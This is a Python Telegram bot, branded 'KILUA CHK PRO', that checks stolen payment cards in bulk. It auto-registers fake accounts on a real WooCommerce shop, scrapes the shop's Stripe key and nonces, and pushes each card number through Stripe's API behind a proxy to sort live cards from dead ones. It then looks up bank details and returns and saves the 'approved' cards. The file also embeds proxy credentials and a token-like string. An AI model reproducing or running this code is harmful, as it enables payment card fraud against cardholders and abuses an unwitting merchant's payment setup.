# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║         🔥 KILUA CHK PRO — by @o8380 / @Mustafa964          ║
║              Stripe Auth Checker · Kilua Services            ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import re
import time
import random
import logging
import threading
from pathlib import Path
from typing import Dict, List, Optional

import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== التكوين الأساسي ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "ضع_توكنك_هنا")
OWNER_ID = int(os.environ.get("OWNER_ID", "1013384909"))
BOT_TAG = "@o8380"
VERSION = "2.0"
CREDITS = "Mustafa 964 · @o8380 · Kilua Services"
WELCOME_VIDEO = "https://t.me/Mustafa964iq/3"

# ==================== البروكسي ====================
PROXY_RAW = "gr-direct.speedyhub.net:21033:ydqjeiy9smojyhnkttgec5+BYdoiLLl:jyvytnua9y"
_px = PROXY_RAW.split(":")
PROXY_HOST, PROXY_PORT, PROXY_USER, PROXY_PASS = _px[0], _px[1], _px[2], _px[3]
PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
PROXIES = {"http": PROXY_URL, "https": PROXY_URL}

# ==================== المسارات ====================
RESULTS_DIR = Path("results")
RESULTS_DIR.mkdir(exist_ok=True)

# ==================== إعدادات التسجيل ====================
logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
logger = logging.getLogger(__name__)

# ==================== البوت ====================
bot = telebot.TeleBot(BOT_TOKEN)
try:
    bot.remove_webhook()
    time.sleep(0.5)
except:
    pass

# ==================== أيقونات مخصصة (Premium) ====================
ICONS = {
    "approve": "5165928140404426202",
    "decline": "5974342591552952895",
    "charge": "5330274810582827128",
    "back": "5060247798616687432",
    "stop": "5242195906199035850",
    "auth": "5330412803587080658",
    "gate": "5059798514972754990",
    "stars": "5060298809943262023",
    "buy": "5059910390280881178",
}

# ==================== حالة الفحص لكل مستخدم ====================
check_states: Dict[int, Dict] = {}
states_lock = threading.Lock()

def get_state(uid: int) -> dict:
    with states_lock:
        return check_states.setdefault(uid, {})

def set_state(uid: int, data: dict):
    with states_lock:
        check_states[uid] = data

def clear_state(uid: int):
    with states_lock:
        check_states.pop(uid, None)

# ==================== Stripe Auth Checker (كل بطاقة بسشن جديد) ====================
class StripeAuthChecker:
    SITE = "analyticorange.com"
    UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    PAYMENT_UA = "stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent"

    def _create_session(self) -> requests.Session:
        """إنشاء سشن جديد مع بروكسي"""
        s = requests.Session()
        s.proxies.update(PROXIES)
        s.headers.update({
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": self.UA,
        })
        return s

    def _register(self, session: requests.Session) -> Optional[requests.Session]:
        """تسجيل مستخدم جديد"""
        try:
            email = f"usr{random.randint(10000, 99999)}{random.randint(10, 99)}@gmail.com"
            resp = session.get(f"https://{self.SITE}/my-account/", timeout=20)
            nonce = resp.text.split('name="woocommerce-register-nonce" value="')[1].split('"')[0]

            session.post(f"https://{self.SITE}/my-account/", data={
                "email": email,
                "password": "7132879938:AAF37jpayVhsr0QcH7i5FmNK0Apfvjzu2-Y",
                "wc_order_attribution_user_agent": self.UA,
                "woocommerce-register-nonce": nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register",
            }, timeout=20)
            return session
        except Exception as e:
            logger.error(f"Registration error: {e}")
            return None

    def check(self, cc: str) -> tuple:
        """
        فحص بطاقة واحدة
        يعيد: (result: str, elapsed: float, response_msg: str)
        """
        start_time = time.time()
        cc = cc.strip()
        parts = cc.split("|")
        if len(parts) < 4:
            return "INVALID", 0, "Invalid format"

        n, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]

        for attempt in range(3):
            try:
                session = self._create_session()
                session = self._register(session)
                if not session:
                    continue

                # جلب صفحة الدفع
                page = session.get(f"https://{self.SITE}/my-account/add-payment-method/", timeout=20).text

                pk_live = re.search(r"(pk_live_[A-Za-z0-9_-]+)", page).group(1)
                add_nonce = page.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]

                # إنشاء PaymentMethod
                pm_data = f"type=card&card[number]={n}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent={self.PAYMENT_UA}&key={pk_live}"
                pm_resp = session.post("https://api.stripe.com/v1/payment_methods", data=pm_data, timeout=20).json()

                if "error" in pm_resp:
                    error_msg = pm_resp["error"].get("message", "Card Error")
                    return "DECLINED", time.time() - start_time, error_msg

                pm_id = pm_resp["id"]

                # تأكيد Setup Intent
                r5 = session.post(f"https://{self.SITE}/wp-admin/admin-ajax.php", data={
                    "action": "wc_stripe_create_and_confirm_setup_intent",
                    "wc-stripe-payment-method": pm_id,
                    "wc-stripe-payment-type": "card",
                    "_ajax_nonce": add_nonce,
                }, timeout=20).text

                elapsed = time.time() - start_time

                if "Your card was declined" in r5 or "could not be set up" in r5:
                    return "DECLINED", elapsed, "Card declined"
                elif "success" in r5.lower():
                    return "APPROVED", elapsed, "Approved - Card is live"
                elif "insufficient" in r5.lower():
                    return "LIVE", elapsed, "Insufficient funds (Live card)"
                elif "cvv" in r5.lower():
                    return "LIVE", elapsed, "CVV failure (Live card)"
                else:
                    return "DECLINED", elapsed, r5[:80]

            except Exception as e:
                logger.warning(f"Attempt {attempt + 1} failed: {e}")
                time.sleep(0.5)
                continue

        return "ERROR", time.time() - start_time, "All attempts failed"

# ==================== BIN Info ====================
_BIN_CACHE = {}

def get_bin_info(bin6: str) -> dict:
    if bin6 in _BIN_CACHE:
        return _BIN_CACHE[bin6]
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=6, proxies=PROXIES).json()
        info = {
            "brand": r.get("brand", "Unknown"),
            "type": r.get("type", "Unknown"),
            "level": r.get("level", "Unknown"),
            "bank": r.get("bank", "Unknown"),
            "country": r.get("country_name", "Unknown"),
            "flag": r.get("country_flag", "🏳️"),
        }
        _BIN_CACHE[bin6] = info
        return info
    except:
        return {"brand": "?", "type": "?", "level": "?", "bank": "?", "country": "?", "flag": "🏳️"}

def mask_card(cc: str) -> str:
    """تخفي الأرقام الحساسة"""
    try:
        parts = cc.split("|")
        num = parts[0]
        if len(num) > 10:
            masked = num[:6] + "*" * (len(num) - 10) + num[-4:]
        else:
            masked = num
        return f"{masked}|{parts[1]}|{parts[2]}|***"
    except:
        return cc

def progress_bar(current: int, total: int, width: int = 12) -> str:
    if total == 0:
        return "░" * width
    filled = int(width * current / total)
    return "█" * filled + "░" * (width - filled)

def is_hit(result: str) -> bool:
    return result in ["APPROVED", "LIVE"]

# ==================== لوحات المفاتيح الاحترافية ====================
def main_keyboard() -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("⚡ Manual Check", callback_data="manual", style="primary", icon_custom_emoji_id=ICONS["auth"]),
        InlineKeyboardButton("📁 Combo Check", callback_data="combo", style="success", icon_custom_emoji_id=ICONS["buy"]),
    )
    markup.row(
        InlineKeyboardButton("📊 Status", callback_data="status", style="primary", icon_custom_emoji_id=ICONS["stars"]),
        InlineKeyboardButton("🛑 Stop", callback_data="stop", style="danger", icon_custom_emoji_id=ICONS["stop"]),
    )
    markup.row(
        InlineKeyboardButton("🏠 Home", callback_data="home", style="primary", icon_custom_emoji_id=ICONS["back"]),
    )
    return markup

def stop_keyboard() -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🛑 Stop Check", callback_data="stop", style="danger", icon_custom_emoji_id=ICONS["stop"]))
    return markup

def home_keyboard() -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🏠 Home", callback_data="home", style="primary", icon_custom_emoji_id=ICONS["back"]))
    return markup

def progress_keyboard(current: int, total: int, approved: int, declined: int, response: str, elapsed: float, is_running: bool = True) -> InlineKeyboardMarkup:
    """شاشة التقدم - كل شيء على شكل أزرار احترافية"""
    percent = int(current / total * 100) if total else 0
    bar = progress_bar(current, total)

    markup = InlineKeyboardMarkup(row_width=2)

    # شريط التقدم
    markup.add(InlineKeyboardButton(f"📊 {bar} {percent}% ({current}/{total})", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["stars"]))

    # الإحصائيات
    markup.row(
        InlineKeyboardButton(f"✅ Approved: {approved}", callback_data="ignore", style="success", icon_custom_emoji_id=ICONS["approve"]),
        InlineKeyboardButton(f"❌ Declined: {declined}", callback_data="ignore", style="danger", icon_custom_emoji_id=ICONS["decline"]),
    )

    # آخر رد
    markup.add(InlineKeyboardButton(f"📝 {response[:45]}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["gate"]))

    # الزمن
    markup.add(InlineKeyboardButton(f"⏱ Time: {elapsed:.2f}s", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["charge"]))

    # زر الإيقاف
    if is_running:
        markup.add(InlineKeyboardButton("🛑 Stop Check", callback_data="stop", style="danger", icon_custom_emoji_id=ICONS["stop"]))

    return markup

def result_keyboard(cc: str, result: str, elapsed: float, bin_info: dict, is_hit_card: bool) -> InlineKeyboardMarkup:
    """نتيجة البطاقة - أزرار احترافية"""
    style = "success" if is_hit_card else "danger"
    icon = ICONS["approve"] if is_hit_card else ICONS["decline"]

    markup = InlineKeyboardMarkup(row_width=1)

    markup.add(InlineKeyboardButton(f"💳 {cc}", callback_data="ignore", style=style, icon_custom_emoji_id=icon))
    markup.add(InlineKeyboardButton(f"📝 {result}", callback_data="ignore", style=style, icon_custom_emoji_id=ICONS["gate"]))
    markup.add(InlineKeyboardButton(f"⏱ Time: {elapsed:.2f}s", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["charge"]))
    markup.add(InlineKeyboardButton(f"🏦 {bin_info['brand']} · {bin_info['type']} · {bin_info['level']}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["auth"]))
    markup.add(InlineKeyboardButton(f"🏛 {bin_info['bank']} {bin_info['flag']}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["gate"]))
    markup.add(InlineKeyboardButton(f"🌍 {bin_info['country']} {bin_info['flag']}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["stars"]))
    markup.add(InlineKeyboardButton(f"🏷 {CREDITS}", callback_data="ignore", style="primary", icon_custom_emoji_id=ICONS["back"]))

    return markup

# ==================== واجهة الترحيب ====================
def welcome_text(name: str) -> str:
    return f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃        🔥 KILUA CHK PRO 🔥        ┃
┃      {BOT_TAG} · v{VERSION}        ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

✨ أهلاً بك <b>{name}</b> ✨

┌────────────────────────────────┐
│  📌 <b>/chk NUM|MM|YY|CVV</b>    │
│  📁 أرسل ملف <code>.txt</code>    │
└────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ {CREDITS}
"""

# ==================== الفحص اليدوي ====================
@bot.message_handler(commands=['chk', 'start'])
def cmd_start_or_chk(message):
    if message.text.startswith('/start'):
        uid = message.from_user.id
        name = message.from_user.first_name or "User"
        clear_state(uid)
        try:
            bot.send_video(message.chat.id, WELCOME_VIDEO, caption=welcome_text(name), parse_mode="HTML", reply_markup=main_keyboard())
        except:
            bot.send_message(message.chat.id, welcome_text(name), parse_mode="HTML", reply_markup=main_keyboard())
        return

    # معالجة /chk
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or "|" not in parts[1]:
        bot.reply_to(message, "❌ الصيغة: <code>/chk NUM|MM|YY|CVV</code>", parse_mode="HTML")
        return

    cc = parts[1].strip()
    prog_msg = bot.reply_to(message, f"🔄 <b>جاري الفحص...</b>\n<code>{mask_card(cc)}</code>", parse_mode="HTML")

    def do_check():
        checker = StripeAuthChecker()
        status, elapsed, response = checker.check(cc)
        bin6 = cc.split("|")[0][:6]
        bin_info = get_bin_info(bin6)
        hit = is_hit(status)

        final_text = f"<b>{'✅ APPROVED' if hit else '❌ DECLINED'}</b>\n━━━━━━━━━━━━━━━━━━\n💳 <code>{cc}</code>\n📝 {response}\n⏱ {elapsed:.2f}s"
        keyboard = result_keyboard(mask_card(cc), response, elapsed, bin_info, hit)

        try:
            bot.edit_message_text(final_text, prog_msg.chat.id, prog_msg.message_id, parse_mode="HTML", reply_markup=keyboard)
        except:
            pass

        if hit:
            with open(RESULTS_DIR / f"{message.from_user.id}_approved.txt", "a", encoding="utf-8") as f:
                f.write(cc + "\n")

    threading.Thread(target=do_check, daemon=True).start()

# ==================== الفحص الكومبو ====================
@bot.message_handler(content_types=['document'])
def handle_combo(message):
    uid = message.from_user.id
    doc = message.document

    if not doc or not doc.file_name.endswith(".txt"):
        bot.reply_to(message, "❌ أرسل ملف <code>.txt</code> فقط", parse_mode="HTML")
        return

    state = get_state(uid)
    if state.get("running"):
        bot.reply_to(message, "⚠️ يوجد فحص جارٍ، استخدم /stop أولاً", parse_mode="HTML")
        return

    prog_msg = bot.send_message(message.chat.id, "🔄 <b>جاري تحميل الملف...</b>", parse_mode="HTML")

    try:
        file_info = bot.get_file(doc.file_id)
        raw = bot.download_file(file_info.file_path)
        lines = [l.strip() for l in raw.decode("utf-8", errors="ignore").splitlines() if l.strip() and "|" in l]
    except Exception as e:
        bot.edit_message_text(f"❌ فشل التحميل: {e}", message.chat.id, prog_msg.message_id, parse_mode="HTML")
        return

    if not lines:
        bot.edit_message_text("❌ لا توجد بطاقات صالحة", message.chat.id, prog_msg.message_id, parse_mode="HTML")
        return

    bot.edit_message_text(f"✅ تم تحميل {len(lines)} بطاقة\n🚀 بدء الفحص...", message.chat.id, prog_msg.message_id, parse_mode="HTML", reply_markup=stop_keyboard())

    threading.Thread(target=run_combo, args=(uid, message.chat.id, prog_msg.message_id, lines), daemon=True).start()

def run_combo(uid: int, chat_id: int, msg_id: int, cards: List[str]):
    """تنفيذ الفحص الكومبو - كل بطاقة بسشن جديد"""
    total = len(cards)
    approved = 0
    declined = 0
    approved_list = []
    declined_list = []

    set_state(uid, {"running": True, "approved": approved_list, "declined": declined_list, "total": total})
    checker = StripeAuthChecker()

    for i, cc in enumerate(cards, 1):
        state = get_state(uid)
        if not state.get("running"):
            break

        # فحص البطاقة بسشن جديد
        status, elapsed, response = checker.check(cc)
        bin6 = cc.split("|")[0][:6]
        bin_info = get_bin_info(bin6)
        hit = is_hit(status)

        if hit:
            approved += 1
            approved_list.append(cc)
            # إرسال نتيجة الموافقة
            bot.send_message(chat_id, f"✅ <b>APPROVED</b>\n━━━━━━━━━━━━━━━━━━\n💳 <code>{cc}</code>\n📝 {response}\n⏱ {elapsed:.2f}s", parse_mode="HTML", reply_markup=result_keyboard(mask_card(cc), response, elapsed, bin_info, True))
        else:
            declined += 1
            declined_list.append(cc)

        # تحديث شاشة التقدم
        try:
            prog_keyboard = progress_keyboard(i, total, approved, declined, response[:40], elapsed, state.get("running", True))
            bot.edit_message_text("", chat_id, msg_id, reply_markup=prog_keyboard)
        except:
            pass

        time.sleep(0.5)

    # حفظ النتائج
    if approved_list:
        (RESULTS_DIR / f"{uid}_approved.txt").write_text("\n".join(approved_list), encoding="utf-8")
    if declined_list:
        (RESULTS_DIR / f"{uid}_declined.txt").write_text("\n".join(declined_list), encoding="utf-8")

    # إرسال الملخص والملفات
    final_text = f"━━━━━━━━━━━━━━━━━━\n✅ تم الانتهاء\n━━━━━━━━━━━━━━━━━━\n📊 الإجمالي: {total}\n✅ Approved: {approved}\n❌ Declined: {declined}\n━━━━━━━━━━━━━━━━━━\n💫 {BOT_TAG}"
    bot.edit_message_text(final_text, chat_id, msg_id, parse_mode="HTML", reply_markup=home_keyboard())

    if approved_list:
        with open(RESULTS_DIR / f"{uid}_approved.txt", "rb") as f:
            bot.send_document(chat_id, f, caption=f"✅ Approved Cards ({approved})", visible_file_name="approved.txt")

    clear_state(uid)

# ==================== أوامر وأزرار إضافية ====================
@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    uid = message.from_user.id
    state = get_state(uid)
    if state.get("running"):
        state["running"] = False
        set_state(uid, state)
        bot.reply_to(message, "🛑 تم إيقاف الفحص", parse_mode="HTML")
    else:
        bot.reply_to(message, "ℹ️ لا يوجد فحص نشط", parse_mode="HTML")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    uid = message.from_user.id
    state = get_state(uid)
    if not state.get("total"):
        bot.reply_to(message, "📊 لا يوجد فحص نشط", parse_mode="HTML")
        return
    total = state.get("total", 0)
    done = len(state.get("approved", [])) + len(state.get("declined", []))
    bot.reply_to(message, f"📊 الحالة\n━━━━━━━━━━━━━━━━━━\n📦 الإجمالي: {total}\n✅ Approved: {len(state.get('approved', []))}\n❌ Declined: {len(state.get('declined', []))}\n📈 متبقي: {total - done}", parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    uid = call.from_user.id
    data = call.data

    if data == "home":
        name = call.from_user.first_name or "User"
        clear_state(uid)
        try:
            bot.edit_message_text(welcome_text(name), call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=main_keyboard())
        except:
            pass
        bot.answer_callback_query(call.id)

    elif data == "manual":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "📌 أرسل الأمر:\n<code>/chk NUM|MM|YY|CVV</code>", parse_mode="HTML")

    elif data == "combo":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "📁 أرسل ملف <code>.txt</code>", parse_mode="HTML")

    elif data == "status":
        bot.answer_callback_query(call.id)
        state = get_state(uid)
        if not state.get("total"):
            bot.send_message(call.message.chat.id, "📊 لا يوجد فحص نشط", parse_mode="HTML")
        else:
            total = state.get("total", 0)
            bot.send_message(call.message.chat.id, f"📊 الحالة\n━━━━━━━━━━━━━━━━━━\n📦 الإجمالي: {total}\n✅ Approved: {len(state.get('approved', []))}\n❌ Declined: {len(state.get('declined', []))}\n📈 متبقي: {total - (len(state.get('approved', [])) + len(state.get('declined', [])))}", parse_mode="HTML")

    elif data == "stop":
        state = get_state(uid)
        if state.get("running"):
            state["running"] = False
            set_state(uid, state)
            bot.answer_callback_query(call.id, "🛑 جاري الإيقاف...")
        else:
            bot.answer_callback_query(call.id, "ℹ️ لا يوجد فحص نشط", show_alert=True)

    elif data == "ignore":
        bot.answer_callback_query(call.id)

# ==================== التشغيل ====================
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════╗
║                  🔥 KILUA CHK PRO v2.0 🔥                   ║
║                   @o8380 · Mustafa 964                      ║
║                     Kilua Services                          ║
╚══════════════════════════════════════════════════════════════╝
    """)
    print(f"✅ Bot Token: {BOT_TOKEN[:10]}...")
    print(f"✅ Owner ID: {OWNER_ID}")
    print(f"✅ Proxy: {PROXY_HOST}:{PROXY_PORT}")
    print("\n🚀 Bot is running...\n")

    while True:
        try:
            bot.infinity_polling(timeout=30, skip_pending=True)
        except Exception as e:
            print(f"❌ Error: {e}")
            time.sleep(5)
